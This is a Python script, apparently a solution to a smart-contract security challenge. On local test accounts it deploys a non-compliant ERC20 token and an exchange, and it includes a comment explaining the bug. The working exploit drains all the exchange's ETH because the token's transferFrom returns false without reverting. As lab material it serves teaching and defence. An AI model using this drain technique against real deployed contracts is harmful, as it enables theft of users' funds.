from ape import accounts, project
from .utils.helper import w3

ONE_ETHER = w3.to_wei(1, "ether")
FIFTY_ETHER = w3.to_wei(50, "ether")


def deploy(deployer):
    deploy_tokens = w3.to_wei(1000, "ether")

    # deploy ERC20 token
    print("\n--- Deploying SToken ---\n")
    token = project.StokenERC20.deploy(deploy_tokens, sender=deployer)

    # deploy exchange contract
    print("\n--- Deploying Exchange ---\n")
    exchange = project.Exchange.deploy(
        token.address,
        value=(FIFTY_ETHER * 5),
        sender=deployer,
    )
    assert exchange.token() == token.address
    assert exchange.balance == FIFTY_ETHER * 5

    return token, exchange


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    user_1 = accounts.test_accounts[1]
    user_2 = accounts.test_accounts[2]
    attacker = accounts.test_accounts[3]

    # get token and exchange
    token, exchange = deploy(deployer)

    # transfer users ether
    token.transfer(user_1.address, FIFTY_ETHER, sender=deployer)
    token.transfer(user_2.address, FIFTY_ETHER, sender=deployer)

    print(f"\n--- ERC20 Token: {token.address}---\n")
    print(f"\n--- Exchange contract: {exchange.address}---\n")

    # Normal user: Holding 50 tokens
    print("\n--- Normal workflow: ---\n")

    user_before_balance = user_1.balance

    # user approves exchange as excepted
    token.approve(exchange.address, FIFTY_ETHER, sender=user_1)
    print(
        f"\n--- Token balance of User 1: {token.balanceOf(user_1.address) /  10**18}---\n"
    )
    print(f"\n--- Before: ETH BALANCE of User 1: {user_before_balance / 10**18}---\n")

    exchange.enter(FIFTY_ETHER, sender=user_1)
    assert exchange.balanceOf(user_1.address) == FIFTY_ETHER
    exchange.exit(FIFTY_ETHER, sender=user_1)

    user_after_balance = user_1.balance

    print(
        f"\n--- Token balance of User 1: {token.balanceOf(user_1.address) /  10**18}---\n"
    )
    print(f"\n--- After: ETH BALANCE of User 1: {user_after_balance / 10**18}---\n")

    # define initial balances for attacker and exchange
    attacker_initial_bal = attacker.balance / 10**18
    exchange_initial_bal = exchange.balance / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Attacker: {attacker_initial_bal}\n⇒ Exchange: {exchange_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    # The STokenERC20 contract does not conform to the ERC20 standard and revert in the `transferFrom()`
    # function if the `from` address does not have sufficient tokens and if the `to` address doesn't
    # have a sufficient allowance. Instead the function returns false. This means that an attacker can
    # call `enter()` in the exchange with an arbitrary amount as the parameter and his account will get
    # credited that amount on the exchange eventhough he never had any tokens and the `transferFrom()`
    # function 'failed'. The attacker can then call `exit()` and drain ETH from the exchange, due to
    # their account being credited as many fake tokens as they specified. The exchange should have checked
    # the return value from the `transferFrom()` function and handled the failure itself instead of assuming
    # the function would revert on failure.
    exchange_bal = exchange.balance
    assert token.balanceOf(attacker.address) == 0
    exchange.enter(exchange_bal, sender=attacker)
    assert exchange.balanceOf(attacker.address) == exchange_bal
    exchange.exit(exchange_bal, sender=attacker)

    # --- AFTER EXPLOIT --- #

    # define final balances for attacker and exchange
    attacker_final_bal = attacker.balance / 10**18
    exchange_final_bal = exchange.balance / 10**18

    print(
        f"\n--- \nFinal Balances:\n⇒ Attacker: {attacker_final_bal}\n⇒ Exchange: {exchange_final_bal}\n---\n"
    )

    assert attacker_final_bal > attacker_initial_bal

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
